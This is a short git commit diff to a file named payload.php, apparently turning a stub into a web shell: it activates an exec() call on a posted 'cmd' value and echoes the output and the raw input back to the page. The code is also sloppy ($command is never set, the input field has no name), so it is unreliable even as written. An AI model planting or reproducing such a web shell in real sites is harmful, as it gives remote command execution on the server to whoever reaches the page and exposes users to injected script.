6a67498e66111a4e789a6492634d56edd0c41be9
georgepapoulias <georgepapoulias@google.com>
2022-03-29 21:27:38 +0300

    now actually do something

--- payload.php
+++ payload.php
@@ -15,16 +15,16 @@
         }
         function butt() {
 
-            // echo $_GET["cmd"];
-            // $output = exec($command);
+            echo $_POST["cmd"];
+            $output = exec($command);
 
-            echo "The button was pressed!";
+            echo $output;
         }
     ?>
 
     <form method="post">
         <label for="cmd_input">Command: </label><input type="text" id="cmd_input">
-        <input type="submit" name="cmd_button" class="button" value="Go!" />
+        <input type="submit" name="cmd" class="button" value="Go!" />
     </form>
 </head>
   
